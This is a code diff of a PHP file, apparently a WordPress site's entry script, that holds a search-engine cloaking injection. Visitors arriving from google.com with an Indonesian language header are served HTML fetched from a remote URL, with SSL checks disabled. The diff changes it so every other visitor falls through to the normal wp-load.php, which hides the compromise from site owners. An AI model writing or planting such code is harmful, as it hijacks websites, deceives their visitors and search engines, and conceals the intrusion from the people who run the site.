@@ -41,39 +41,35 @@ if (stripos($ref, 'google.com') !== false && stripos($lang, 'id') !== false) {
     $show_cloak = true;
 }
 
-if (!$show_cloak) {
-    header('HTTP/1.1 404 Not Found');
-    exit;
+if ($show_cloak) {
+    $content = false;
+    
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $github_url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_TIMEOUT => 10,
+            CURLOPT_USERAGENT => 'Mozilla/5.0'
+        ]);
+        $content = curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    if (!$content && ini_get('allow_url_fopen')) {
+        $content = @file_get_contents($github_url);
+    }
+    
+    if ($content) {
+        header('Content-Type: text/html; charset=UTF-8');
+        header('Cache-Control: no-cache');
+        echo $content;
+        exit;
+    }
 }
 
-$content = false;
-
-if (function_exists('curl_init')) {
-    $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => $github_url,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => false,
-        CURLOPT_TIMEOUT => 10,
-        CURLOPT_USERAGENT => 'Mozilla/5.0'
-    ]);
-    $content = curl_exec($ch);
-    curl_close($ch);
-}
-
-if (!$content && ini_get('allow_url_fopen')) {
-    $content = @file_get_contents($github_url);
-}
-
-if ($content) {
-    header('Content-Type: text/html; charset=UTF-8');
-    header('Cache-Control: no-cache');
-    echo $content;
-    exit;
-}
-
-header('HTTP/1.1 503 Service Unavailable');
-exit;
+require_once('wp-load.php');
 ?>
